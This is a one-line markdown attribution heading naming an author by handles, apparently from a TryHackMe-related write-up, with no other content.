### Created by ****shayolee(THM) sHayo_l33(x foemrly twitter)****
